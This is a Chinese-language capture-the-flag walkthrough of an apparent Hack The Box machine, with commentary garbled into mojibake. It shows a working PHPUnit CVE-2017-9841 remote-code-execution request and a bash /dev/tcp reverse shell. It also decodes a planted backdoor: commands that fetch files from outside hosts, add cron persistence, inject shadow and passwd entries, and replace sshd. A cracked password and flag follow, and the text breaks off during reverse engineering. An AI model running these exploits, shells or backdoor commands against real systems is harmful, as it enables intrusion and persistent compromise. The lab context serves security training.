,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://store.djewelry.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ js [Status: 301, Size: 321, Words: 20, Lines: 10] images [Status: 301, Size: 325, Words: 20, Lines: 10] css [Status: 301, Size: 322, Words: 20, Lines: 10] fonts [Status: 301, Size: 324, Words: 20, Lines: 10] vendor [Status: 301, Size: 325, Words: 20, Lines: 10] server-status [Status: 403, Size: 283, Words: 20, Lines: 10] [Status: 200, Size: 6215, Words: 528, Lines: 196] :: Progress: [20116/20116] :: Job [1/1] :: 106 req/sec :: Duration: [0:03:03] :: Errors: 0 :: æŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹ åœ¨vendoré‡Œæœ‰ä¸å°‘ä¸œè¥¿ï¼Œæœ‰ç‚¹æ„æ€ &#x2F;vendor&#x2F;phpunit&#x2F;phpunit&#x2F; åœ¨è¿™ä¸ªè·¯å¾„ä¸­å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ›´æ–°è®°å½•ï¼Œæœ€åä¸€ä¸ªç‰ˆæœ¬æ˜¯5.6ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ChangeLog-5.6.md # Changes in PHPUnit 5.6 All notable changes of the PHPUnit 5.6 release series are documented in this file using the [Keep a CHANGELOG](http://keepachangelog.com/) principles. ## [5.6.2] - 2016-10-25 New PHAR release due to updated dependencies ## [5.6.1] - 2016-10-07 ### Fixed * Fixed [#2320](https://github.com/sebastianbergmann/phpunit/issues/2320): Conflict between `PHPUnit_Framework_TestCase::getDataSet()` and `PHPUnit_Extensions_Database_TestCase::getDataSet()` ## [5.6.0] - 2016-10-07 ### Added * Merged [#2240](https://github.com/sebastianbergmann/phpunit/pull/2240): Provide access to a test case&#39;s data set (for use in `setUp()`, for instance) * Merged [#2262](https://github.com/sebastianbergmann/phpunit/pull/2262): Add the `PHPUnit_Framework_Constraint_DirectoryExists`, `PHPUnit_Framework_Constraint_IsReadable`, and `PHPUnit_Framework_Constraint_IsWritable` constraints as well as the `assertIsReadable()`, `assertNotIsReadable()`, `assertIsWritable()`, `assertNotIsWritable()`, `assertDirectoryExists()`, `assertDirectoryNotExists()`, `assertDirectoryIsReadable()`, `assertDirectoryNotIsReadable()`, `assertDirectoryIsWritable()`, `assertDirectoryNotIsWritable()`, `assertFileIsReadable()`, `assertFileNotIsReadable()`, `assertFileIsWritable()`, and `assertFileNotIsWritable()` assertions * Added `PHPUnit\\Framework\\TestCase::createConfiguredMock()` based on [idea](https://twitter.com/kriswallsmith/status/763550169090625536) by Kris Wallsmith * Added the `@doesNotPerformAssertions` annotation for excluding a test from the &quot;useless test&quot; risky test check ### Changed * Deprecated `PHPUnit\\Framework\\TestCase::setExpectedExceptionRegExp()` * `PHPUnit_Util_Printer` no longer optionally cleans up HTML output using `ext/tidy` [5.6.2]: https://github.com/sebastianbergmann/phpunit/compare/5.6.1...5.6.2 [5.6.1]: https://github.com/sebastianbergmann/phpunit/compare/5.6.0...5.6.1 [5.6.0]: https://github.com/sebastianbergmann/phpunit/compare/5.5...5.6.0 è¿™è¾¹ç»™å‡ºäº†ä¸€ä¸ªæ›´æ–°æ—¶é—´ï¼Œæœ€åä¸€æ¬¡æ˜¯åœ¨2016-10-25ï¼Œé‚£å’±ä»¬çœ‹çœ‹PHPUnitåœ¨è¿™ä¸ªæ—¶é—´ä¹‹åçš„æ¼æ´å°±å¯ä»¥äº† è¿™è¾¹æœç´¢åå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªCVE-2017-9841æ˜¯ç¬¦åˆæˆ‘ä»¬çš„æ¡ä»¶çš„ æ¼æ´åˆ©ç”¨Exploithttp://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php https://www.cvedetails.com/cve/CVE-2017-9841/ https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.zh-cn.md æ ¹æ®ä¸Šé¢å¯¹è¯¥æ¼æ´çš„æè¿°ï¼Œåœ¨vendor&#x2F;phpunit&#x2F;phpunit&#x2F;src&#x2F;Util&#x2F;PHP&#x2F;eval-stdin.phpå¤„è¿›è¡Œåˆ©ç”¨ï¼Œå’±ä»¬æŠ“ä¸ªåŒ…è¿›è¡Œä¸€æ¬¡å°è¯• åœ¨ä¸‹æ–¹åŠ å…¥ç„¶åæ”¾åŒ…æ‰§è¡Œ æˆåŠŸè¢«æ‰§è¡Œäº† ç°åœ¨å’±ä»¬æ¥æƒ³åŠæ³•æ„é€ ä¸€ä¸‹å‘½ä»¤ GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1 Host: store.djewelry.htb Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 24 &lt;?php system(&quot;whoami&quot;)?&gt; æˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œç”¨curlçœ‹çœ‹èƒ½ä¸èƒ½æˆåŠŸå§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data &quot;&lt;?php system(&#39;whoami&#39;)?&gt;&quot; www-data OKï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¹ˆç°åœ¨æ¥æ„é€ pocå›å¼¹shellå§ Shellä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 &lt;?php system(&#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.24/4444 0&gt;&amp;1&quot;&#39;)?&gt; åœ¨burpé‡Œæ‰§è¡Œå³å¯è·å¾—shell â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.11.146] 56644 bash: cannot set terminal process group (865): Inappropriate ioctl for device bash: no job control in this shell www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; &lt;HP$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ whoami&amp;&amp;id &lt;ore/vendor/phpunit/phpunit/src/Util/PHP$ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) æˆåŠŸæ‹¿åˆ°ä¸€ä¸ªshell Ctrl+Zè¿”å› stty raw -echo; fg export TERM=xterm stty rows 51 cols 237 ä¿®å¤ä¸€ä¸‹shell æƒé™æå‡Userwww-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ grep &#39;bash&#39; /etc/passwd root:x:0:0:root:/root:/bin/bash steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash steven1:x:1000:1000:,,,:/home/steven:/bin/bash å’±ä»¬çš„ææƒç›®æ ‡å°±åœ¨stevenå’Œsteven1è¿™ä¸¤ä¸ªç”¨æˆ·ä¸Šäº† www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd /home www-data@production:/home$ ls steven www-data@production:/home$ cd steven bash: cd: steven: Permission denied www-data@production:/home$ ls -la total 12 drwxr-xr-x 3 root root 4096 Feb 8 19:59 . drwxr-xr-x 19 root root 4096 Feb 8 19:59 .. drwxr-x--- 5 steven steven 4096 Feb 8 19:59 steven æ²¡æœ‰æƒé™è¿›å…¥stevenç”¨æˆ·ç›®å½•ï¼Œè¿™é‡Œæš‚æ—¶æ²¡æœ‰æ€è·¯äº†ï¼Œè·‘ä¸€ä¸ªLinpeasçœ‹çœ‹ linpeasè·‘å‡ºæ¥çš„ç»“æœæ¯”è¾ƒå¤šï¼Œå°±ä¸å…¨è´´å‡ºæ¥äº†ï¼Œå…¶ä¸­çœ‹åˆ°ä¸€ä¸ª &#x2F;var&#x2F;backups&#x2F;infoå­˜åœ¨ä¸€ä¸ªè¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ˜¯www-dataæƒé™çš„ï¼Œå»çœ‹çœ‹ www-data@production:/var/backups$ ls -la total 72 drwxr-xr-x 2 root root 4096 Feb 24 23:49 . drwxr-xr-x 13 root root 4096 Feb 8 19:59 .. -rw-r--r-- 1 root root 34011 Feb 8 19:05 apt.extended_states.0 -r-x------ 1 www-data www-data 27296 May 14 2021 info www-data@production:/var/backups$ file info info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped è¿™æ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b åœ¨ä¸€å¤§å †ä¹±ç ä¸­æ‰¾åˆ°äº†è¿™ä¹ˆä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo &quot;776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b&quot; | xxd -r -p wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo &quot;* 3 * * * root /var/lib/.main&quot; &gt;&gt; /etc/crontab; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 {system(&quot;echo &quot;$1&quot;1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&quot;)}&#39; /etc/passwd; awk -F&quot;:&quot; &#39;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 {system(&quot;echo &quot;$1&quot; &quot;$3&quot; &quot;$6&quot; &quot;$7&quot; &gt; users.txt&quot;)}&#39; /etc/passwd; while read -r user group home shell _; do echo &quot;$user&quot;1&quot;:x:$group:$group:,,,:$home:$shell&quot; &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt; æˆ‘ä»¬å°†å®ƒè½¬ä¸ºASCIIæ ¼å¼ æå–å‡ºè¿™ä¹ˆä¸€ä¸²hashï¼Œç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹ $6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/ ç„¶åå†è¯»å–ä¸­çŸ¥é“äº†è¿™ä¸€ä¸²åº”è¯¥æ˜¯setven1çš„å¯†ç ï¼Œå»ä½¿ç”¨johnçˆ†ç ´ä¸€ä¸‹è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status ihatehackers (?) 1g 0:00:00:55 DONE (2022-02-25 01:39) 0.01789g/s 1594p/s 1594c/s 1594C/s jojo95..halo03 Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed å¾—åˆ°äº†setven1çš„å¯†ç  username = steven1 password = ihatehackers ä½¿ç”¨sshè¿›è¡Œè¿æ¥ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh steven1@10.10.11.146 steven1@10.10.11.146&#39;s password: steven@production:~$ whoami&amp;&amp;id steven uid=1000(steven) gid=1000(steven) groups=1000(steven) æˆåŠŸè·å¾—useræƒé™ steven@production:~$ ls user.txt steven@production:~$ cat user.txt e27e4aba73ab8ba7421550905082163e æˆåŠŸè·å¾—useræƒé™çš„flagæ–‡ä»¶ Rootsudo -læç¤ºå¤±è´¥ï¼Œé‚£å°±è·‘ä¸ªlinpeas.shçœ‹çœ‹æƒ…å†µå§ [+] Mails (limit 50) 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/mail/steven 17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021 /var/spool/mail/steven çœ‹åˆ°ä¸¤ä¸ªå…³äºé‚®ä»¶çš„ä¿¡æ¯ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ steven@production:~$ cat /var/mail/steven From root@production Sun, 25 Jul 2021 10:31:12 GMT Return-Path: &lt;root@production&gt; Received: from production (localhost [127.0.0.1]) by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847 for &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT Received: (from root@localhost) by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847; Sun, 25 Jul 2021 10:31:12 GMT Date: Sun, 25 Jul 2021 10:31:12 GMT Message-Id: &lt;202107251031.80FAcdZ171847@production&gt; To: steven@production From: root@production Subject: Investigations Hi Steven. We recently updated the system but are still experiencing some strange behaviour with the Apache service. We have temporarily moved the web store and database to another server whilst investigations are underway. If for any reason you need access to the database or web application code, get in touch with Mark and he will generate a temporary password for you to authenticate to the temporary server. Thanks, sysadmin è¿™é‡Œå¤§æ¦‚æ„æ€æ˜¯è¯´æœ€è¿‘æ›´æ–°äº†ä¸€ä¸‹ç³»ç»Ÿï¼Œä½†æ˜¯åœ¨apacheä¸Šæœ‰ç‚¹å¥‡æ€ªçš„é—®é¢˜ï¼Œæ‰€ä»¥æš‚æ—¶æŠŠå•†åŸå’Œæ•°æ®åº“æ¬è¿åˆ°å¦ä¸€å°æœåŠ¡å™¨ä¸Šäº†ï¼Œæ­£åœ¨æ’æŸ¥åŸå› ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦è®¿é—®çš„è¯å¯ä»¥è”ç³»Markï¼Œä»–ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªä¸´æ—¶å¯†ç çš„ è¿™é‡Œæˆ‘çŒœæµ‹åº”è¯¥æ˜¯åšé‚®ä»¶ä¼ªé€ äº† ä¸è¿‡æˆ‘ä»¬è¿˜æ˜¯å…ˆå»çœ‹çœ‹apacheæœåŠ¡å§ apacheæœåŠ¡ç›®å½•ä½äº&#x2F;usr&#x2F;lib steven@production:~$ ls -la /usr/lib/apache2/ total 28 drwxr-xr-x 3 root root 4096 Jul 5 2021 . drwxr-xr-x 82 root root 4096 Feb 8 19:59 .. drwxr-xr-x 2 root root 20480 Jan 28 21:05 modules æˆ‘ä»¬å¯¹è¿™ä¸ªç›®å½•æœ‰è¯»å–å’Œæ‰§è¡Œæƒé™ï¼Œè¿˜ä¸é”™ï¼Œå»çœ‹çœ‹ steven@production:/usr/lib/apache2/modules$ ls -la total 8796 drwxr-xr-x 2 root root 20480 Jan 28 21:05 . drwxr-xr-x 3 root root 4096 Jul 5 2021 .. -rw-r--r-- 1 root root 15925 Jan 5 14:49 httpd.exp -rw-r--r-- 1 root root 4625776 Nov 25 23:16 libphp7.4.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_access_compat.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_actions.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_alias.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_allowmethods.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_asis.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_auth_basic.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_auth_digest.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_auth_form.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_anon.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_core.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_dbd.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_dbm.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authn_file.so -rw-r--r-- 1 root root 22768 Jan 5 14:49 mod_authn_socache.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_authnz_fcgi.so -rw-r--r-- 1 root root 55528 Jan 5 14:49 mod_authnz_ldap.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_authz_core.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_dbd.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_dbm.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_groupfile.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_host.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_owner.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_authz_user.so -rw-r--r-- 1 root root 43216 Jan 5 14:49 mod_autoindex.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_brotli.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_bucketeer.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_buffer.so -rw-r--r-- 1 root root 80176 Jan 5 14:49 mod_cache.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_cache_disk.so -rw-r--r-- 1 root root 39152 Jan 5 14:49 mod_cache_socache.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_case_filter.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_case_filter_in.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_cern_meta.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_cgi.so -rw-r--r-- 1 root root 43216 Jan 5 14:49 mod_cgid.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_charset_lite.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_data.so -rw-r--r-- 1 root root 104656 Jan 5 14:49 mod_dav.so -rw-r--r-- 1 root root 59600 Jan 5 14:49 mod_dav_fs.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_dav_lock.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_dbd.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_deflate.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_dialup.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_dir.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_dumpio.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_echo.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_env.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_expires.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_ext_filter.so -rw-r--r-- 1 root root 14592 Jan 5 14:49 mod_file_cache.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_filter.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_headers.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_heartbeat.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_heartmonitor.so -rw-r--r-- 1 root root 253632 Jan 5 14:49 mod_http2.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_ident.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_imagemap.so -rw-r--r-- 1 root root 55504 Jan 5 14:49 mod_include.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_info.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_lbmethod_bybusyness.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_lbmethod_byrequests.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_lbmethod_bytraffic.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_lbmethod_heartbeat.so -rw-r--r-- 1 root root 84176 Jan 5 14:49 mod_ldap.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_log_debug.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_log_forensic.so -rw-r--r-- 1 root root 134544 Jan 5 14:49 mod_lua.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_macro.so -rw-r--r-- 1 root root 260672 Jan 5 14:49 mod_md.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_mime.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_mime_magic.so -rw-r--r-- 1 root root 67792 Jan 5 14:49 mod_mpm_event.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_mpm_prefork.so -rw-r--r-- 1 root root 47312 Jan 5 14:49 mod_mpm_worker.so -rw-r--r-- 1 root root 39120 Jan 5 14:49 mod_negotiation.so -rw-r--r-- 1 root root 133888 Jan 5 14:49 mod_proxy.so -rw-r--r-- 1 root root 55504 Jan 5 14:49 mod_proxy_ajp.so -rw-r--r-- 1 root root 59600 Jan 5 14:49 mod_proxy_balancer.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_proxy_connect.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_proxy_express.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_proxy_fcgi.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_proxy_fdpass.so -rw-r--r-- 1 root root 47312 Jan 5 14:49 mod_proxy_ftp.so -rw-r--r-- 1 root root 35024 Jan 5 14:49 mod_proxy_hcheck.so -rw-r--r-- 1 root root 39152 Jan 5 14:49 mod_proxy_html.so -rw-r--r-- 1 root root 47312 Jan 5 14:49 mod_proxy_http.so -rw-r--r-- 1 root root 67936 Jan 5 14:49 mod_proxy_http2.so -rw-r--r-- 1 root root 22768 Jan 5 14:49 mod_proxy_scgi.so -rw-r--r-- 1 root root 22656 Jan 5 14:49 mod_proxy_uwsgi.so -rw-r--r-- 1 root root 18560 Jan 5 14:49 mod_proxy_wstunnel.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_ratelimit.so -rw-r--r-- 1 root root 34800 May 17 2021 mod_reader.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_reflector.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_remoteip.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_reqtimeout.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_request.so -rw-r--r-- 1 root root 75984 Jan 5 14:49 mod_rewrite.so -rw-r--r-- 1 root root 43216 Jan 5 14:49 mod_sed.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_session.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_session_cookie.so -rw-r--r-- 1 root root 30928 Jan 5 14:49 mod_session_crypto.so -rw-r--r-- 1 root root 22736 Jan 5 14:49 mod_session_dbd.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_setenvif.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_slotmem_plain.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_slotmem_shm.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_socache_dbm.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_socache_memcache.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_socache_redis.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_socache_shmcb.so -rw-r--r-- 1 root root 18640 Jan 5 14:49 mod_speling.so -rw-r--r-- 1 root root 248240 Jan 5 14:49 mod_ssl.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_status.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_substitute.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_suexec.so -rw-r--r-- 1 root root 14464 Jan 5 14:49 mod_unique_id.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_userdir.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_usertrack.so -rw-r--r-- 1 root root 14544 Jan 5 14:49 mod_vhost_alias.so -rw-r--r-- 1 root root 26832 Jan 5 14:49 mod_xml2enc.so æ–‡ä»¶æœ‰ç‚¹å¤šå•Šï¼Œé‚£ä¹ˆç¨å¾®ç­›é€‰ä¸€ä¸‹ï¼ŒæŒ‰ç…§æœ€è¿‘ä¿®æ”¹æ¥æ’åº steven@production:/usr/lib/apache2/modules$ ls --full-time -i | sort -u 2050 -rw-r--r-- 1 root root 34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so å°±æ˜¯è¿™ä¸ªæ–‡ä»¶äº†ï¼Œæˆ‘ä»¬æŠŠå®ƒä¸‹è½½ä¸‹æ¥çœ‹çœ‹ scp steven1@10.10.11.146:/usr/lib/apache2/modules/mod_reader.so ~/Desktop ä¸‹è½½ä¸‹æ¥åï¼Œåœ¨mod_reader.soä¸­æå–åˆ°ä¸€æ®µbase64ç  d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk ç»™è§£æä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo -n &#39;d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk&#39; | base64 -d wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd è¿™è¾¹æ˜¯æŠŠè¿™å¼ å›¾ç‰‡ä¼ è¾“åˆ°sshdï¼Œå»ä¸‹è½½ä¸‹æ¥ ä½¿ç”¨ghidraæ‰“å¼€è¿›è¡Œé€†å‘ ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ï¼Œæˆ‘ä»¬çš„å¯†ç æ˜¯31ä½ backdoor._28_2_ = 0xa9f4; backdoor._24_4_ = 0xbcf0b5e3; backdoor._16_8_ = 